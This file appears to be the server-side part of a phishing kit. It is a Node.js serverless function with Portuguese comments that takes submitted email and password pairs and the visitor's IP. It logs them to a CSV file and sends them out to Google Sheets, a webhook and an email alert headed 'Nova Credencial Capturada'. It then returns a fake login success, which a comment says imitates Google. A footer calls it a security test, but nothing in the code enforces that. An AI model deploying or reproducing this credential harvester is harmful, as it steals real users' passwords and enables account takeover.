const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;
const nodemailer = require('nodemailer');
const { saveToGoogleSheets } = require('./save-to-sheets');

// Caminho do arquivo CSV (usar /tmp na Vercel)
const CSV_FILE = path.join('/tmp', 'credentials.csv');

// Função para inicializar CSV se não existir
async function initCSV() {
    if (!fs.existsSync(CSV_FILE)) {
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: false
        });
        await csvWriter.writeRecords([]);
        console.log('Arquivo CSV criado com sucesso');
    }
}

// Função para enviar webhook
function sendWebhook(url, data) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const isHttps = urlObj.protocol === 'https:';
        const client = isHttps ? https : http;
        
        const postData = JSON.stringify(data);
        
        const options = {
            hostname: urlObj.hostname,
            port: urlObj.port || (isHttps ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(postData)
            }
        };
        
        const req = client.request(options, (res) => {
            let responseData = '';
            res.on('data', (chunk) => { responseData += chunk; });
            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    resolve(responseData);
                } else {
                    reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
                }
            });
        });
        
        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// Função para enviar email com as credenciais
async function sendEmailNotification(email, password, timestamp, ip) {
    // Pegar configurações de email das variáveis de ambiente
    const emailConfig = {
        to: process.env.EMAIL_TO, // Seu email para receber
        from: process.env.EMAIL_FROM || process.env.EMAIL_TO,
        smtp: {
            host: process.env.SMTP_HOST || 'smtp.gmail.com',
            port: parseInt(process.env.SMTP_PORT || '587'),
            secure: process.env.SMTP_SECURE === 'true',
            auth: {
                user: process.env.SMTP_USER,
                pass: process.env.SMTP_PASS
            }
        }
    };

    // Se não tiver email configurado, não enviar
    if (!emailConfig.to || !emailConfig.smtp.auth.user) {
        console.log('Email não configurado, pulando envio');
        return;
    }

    // Criar transporter
    const transporter = nodemailer.createTransport({
        host: emailConfig.smtp.host,
        port: emailConfig.smtp.port,
        secure: emailConfig.smtp.secure,
        auth: emailConfig.smtp.auth
    });

    // Criar mensagem
    const mailOptions = {
        from: emailConfig.from,
        to: emailConfig.to,
        subject: `🔐 Nova Credencial Capturada - ${email}`,
        html: `
            <h2>Nova Credencial Capturada</h2>
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Senha:</strong> ${password}</p>
            <p><strong>Data/Hora:</strong> ${new Date(timestamp).toLocaleString('pt-BR')}</p>
            <p><strong>IP Address:</strong> ${ip}</p>
            <hr>
            <p><small>Este é um email automático do sistema de teste de segurança.</small></p>
        `,
        text: `
Nova Credencial Capturada

Email: ${email}
Senha: ${password}
Data/Hora: ${new Date(timestamp).toLocaleString('pt-BR')}
IP Address: ${ip}

Este é um email automático do sistema de teste de segurança.
        `
    };

    // Enviar email
    const info = await transporter.sendMail(mailOptions);
    console.log('Email enviado com sucesso:', info.messageId);
}

module.exports = async (req, res) => {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Lidar com preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Apenas aceitar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Inicializar CSV se necessário
        await initCSV();

        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Criar writer com append
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: true
        });

        // Salvar no CSV
        await csvWriter.writeRecords([{
            timestamp: timestamp,
            email: email,
            password: password,
            ip: ip
        }]);

        console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);

        // Salvar no Google Sheets (se configurado)
        try {
            await saveToGoogleSheets(email, password, timestamp, ip);
        } catch (sheetsError) {
            console.error('Erro ao salvar no Google Sheets (não crítico):', sheetsError);
            // Não falhar a requisição se o Sheets não salvar
        }

        // Enviar para webhook (se configurado) - mais simples!
        const webhookUrl = process.env.WEBHOOK_URL;
        if (webhookUrl) {
            try {
                await sendWebhook(webhookUrl, { email, password, timestamp, ip });
                console.log('Webhook enviado com sucesso');
            } catch (webhookError) {
                console.error('Erro ao enviar webhook (não crítico):', webhookError);
            }
        }

        // Enviar email com as credenciais (se configurado)
        try {
            await sendEmailNotification(email, password, timestamp, ip);
        } catch (emailError) {
            console.error('Erro ao enviar email (não crítico):', emailError);
            // Não falhar a requisição se o email não enviar
        }

        // Retornar sucesso (simular resposta do Google)
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
